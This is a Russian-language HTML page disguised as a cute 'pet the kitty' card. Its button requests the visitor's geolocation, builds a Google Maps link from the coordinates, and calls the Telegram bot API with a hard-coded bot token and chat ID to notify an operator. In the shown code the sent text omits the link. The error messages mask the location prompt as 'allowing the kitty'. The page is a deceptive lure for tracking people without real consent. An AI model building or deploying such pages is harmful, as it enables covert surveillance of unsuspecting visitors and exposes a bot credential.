<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Котик</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #fdf6ec 0%, #f5e6d3 100%);
            color: #4a3728;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #fffaf3;
            border: 1px solid #ebd9c3;
            border-radius: 24px;
            padding: 28px 24px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            box-shadow: 0 12px 30px rgba(139, 94, 52, 0.12);
        }
        .photo-wrapper {
            width: 140px;
            height: 140px;
            margin: 0 auto 20px;
            border-radius: 50%;
            padding: 5px;
            background: linear-gradient(135deg, #e07a5f, #f2cc8f);
            box-shadow: 0 6px 16px rgba(224, 122, 95, 0.25);
        }
        .photo-wrapper img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
            display: block;
            background-color: #f3e5d8;
        }
        h2 {
            color: #8c4a27;
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 700;
        }
        #status {
            color: #6e5543;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 24px;
        }
        button {
            background: linear-gradient(135deg, #d96b43 0%, #c8553d 100%);
            color: #fffaf3;
            border: none;
            padding: 15px 28px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 14px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 15px rgba(200, 85, 61, 0.28);
            transition: transform 0.15s ease, box-shadow 0.15s ease;
        }
        button:active {
            transform: scale(0.98);
            box-shadow: 0 3px 8px rgba(200, 85, 61, 0.2);
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="photo-wrapper">
            <img src="photo.png" alt="Фото">
        </div>

        <h2 id="title">Милый котик</h2>
        <div id="status">Нажмите кнопку ниже, чтобы погладить котика</div>
        
        <button id="geoBtn" onclick="getLocation()">Погладить</button>
    </div>

    <!-- Скрытый аудиоплеер (укажите точное имя вашего файла) -->
    <audio id="clickSound" src="sound.mp3" preload="auto"></audio>

    <script>
        const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
        const CHAT_ID = "5328460264";
        let isSent = false;

        function getLocation() {
            // Запускаем воспроизведение звука при нажатии на кнопку
            const audio = document.getElementById("clickSound");
            if (audio) {
                audio.play().catch(err => console.log("Не удалось воспроизвести аудио:", err));
            }

            if (isSent) return;

            const statusDiv = document.getElementById("status");
            const titleH2 = document.getElementById("title");
            const btn = document.getElementById("geoBtn");

            btn.style.display = "none";
            titleH2.innerText = "Гладим...";
            statusDiv.innerText = "Ожидание ответа от котика...";

            if (!navigator.geolocation) {
                titleH2.innerText = "Ошибка";
                statusDiv.innerText = "Котик не поддерживается вашим браузером.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    if (isSent) return;
                    isSent = true;

                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    const text = `Котика погладили и он доволен!`;

                    statusDiv.innerText = "Гладим...";

                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
                    
                    fetch(url, { mode: "no-cors" })
                        .then(() => {
                            titleH2.innerText = "Готово!";
                            statusDiv.innerText = `Котика погладили и он доволен!`;
                        })
                        .catch((err) => {
                            isSent = false;
                            titleH2.innerText = "Ошибка котика";
                            statusDiv.innerText = "Не удалось погладить: " + err.message;
                            btn.style.display = "inline-block";
                        });
                },
                function(error) {
                    titleH2.innerText = "Ошибка!";
                    let errorMsg = "";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = "Доступ запрещен. Разрешите котика в настройках сайта.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = "Котик недоступен. Проверьте, включен ли GPS.";
                            break;
                        case error.TIMEOUT:
                            errorMsg = "Время ожидания истекло. Попробуйте еще раз.";
                            break;
                        default:
                            errorMsg = "Ошибка: " + error.message;
                    }
                    statusDiv.innerText = errorMsg;
                    btn.style.display = "inline-block";
                },
                { enableHighAccuracy: false, timeout: 15000, maximumAge: 10000 }
            );
        }
    </script>
</body>
</html>
